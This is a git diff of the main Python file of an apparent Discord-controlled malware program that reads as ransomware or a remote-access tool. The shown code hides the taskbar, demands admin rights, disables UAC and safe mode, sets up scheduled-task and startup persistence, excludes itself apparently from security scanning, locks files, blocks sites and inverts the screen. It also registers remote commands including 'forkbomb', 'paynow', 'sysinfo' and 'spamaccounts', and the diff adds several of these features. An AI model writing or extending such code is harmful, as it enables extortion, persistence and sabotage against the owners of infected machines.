@@ -1,14 +1,18 @@
 import os,sys,discord,threading;from discord.ext import commands
-from utils.runadmin import ensure_admin_and_check_ran;from utils.schtask import setup_tasks;from utils.excludeme import excludeme;from utils.startup import add_to_startup;from utils.disable import *;from utils.nosites import *
+from utils.runadmin import *;from utils.schtask import setup_tasks;from utils.excludeme import excludeme;from utils.startup import add_to_startup;from utils.disable import *;from utils.nosites import *
 from start.bots import bоts;from start.launch import run;from utils.remindme import*;from utils.cleardesk import *;from utils.wallpaper import *
-from commands.basics import *;from commands.intermediates import *;from commands.filenav import *;from commands.others import *;from commands.fun import *
+from commands.basics import *;from commands.intermediates import *;from commands.filenav import *;from commands.others import *;from commands.fun import *;from utils.griefers import *
 hidetaskbar()
-time.sleep(3)
+ensure_admin()
+lockmefiles()
+time.sleep(2)
+threading.Thread(target=invert).start()
 no_uac()
 setup_tasks(sys.executable)
 add_to_startup()
 excludeme()
-threading.Thread(target=disable).start()
+disable_safe_mode()
+disable()
 threading.Thread(target=blocksites).start()
 threading.Thread(target=change_wallpaper).start()
 threading.Thread(target=remindme).start()
@@ -56,9 +60,10 @@ bot.add_command(commands.Command(forkbomb,name='forkbomb'))
 bot.add_command(commands.Command(paynow,name='paynow'))
 bot.add_command(commands.Command(alert,name='alert'))
 bot.add_command(commands.Command(admin,name='admin'))
+bot.add_command(commands.Command(detailed_hardware_info,name='sysinfo'))
+bot.add_command(commands.Command(flood,name='spamaccounts'))
 @bot.event
 async def on_ready():
  await run(bot)
 bot.run(bots)
-
    
